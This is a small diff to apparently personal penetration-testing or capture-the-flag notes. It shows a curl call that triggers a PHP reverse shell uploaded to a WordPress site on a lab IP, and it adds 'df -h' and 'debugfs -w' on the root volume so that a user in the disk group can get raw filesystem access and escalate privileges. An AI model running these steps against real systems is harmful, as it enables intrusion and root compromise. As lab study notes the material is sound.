@@ -435,6 +435,8 @@ curl http://192.168.231.16/wp-admin/php-reverse-shell.php
 
 # privilege
 groups=1000(dora),6(disk)
+df -h
+debugfs -w /dev/mapper/ubuntu--vg-ubuntu--lv
 
 ```
 
